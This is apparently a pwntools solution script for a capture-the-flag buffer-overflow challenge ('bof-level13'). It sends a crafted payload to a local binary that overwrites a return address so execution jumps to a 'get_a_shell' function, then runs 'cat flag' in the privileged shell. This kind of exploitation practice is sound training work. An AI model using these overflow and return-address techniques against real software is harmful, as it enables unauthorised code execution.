from pwn import *
import os

DEBUG = False # toggles gdb.debug or process
elf = ELF('./bof-level13') # replace this with the actual level

# launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = elf.debug(env={}, gdbscript='''
b fgets@plt
# b *0x400dce 
continue
''')

else:
    io = elf.process(env={})


# END SETUP BOILERPLATE
# BEGIN CHALLENGE-SPECIFIC CODE
get_a_shell = p64(elf.symbols["get_a_shell"])

data_ptr =  0x7ffffffffe20b
ret_addr =  0x7ffffffffe318

payload = b">" * (ret_addr - data_ptr - 1 - 4) + 8 * b',>' + b'[' + b'\n' + get_a_shell
io.send(payload)

# END CHALLENGE-SPECIFIC CODE
# BEGIN FLAG RETRIEVAL BOILERPLATE

import re
io.sendlineafter(b'Spawning a privileged shell', b'cat flag')
flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
print(flag)
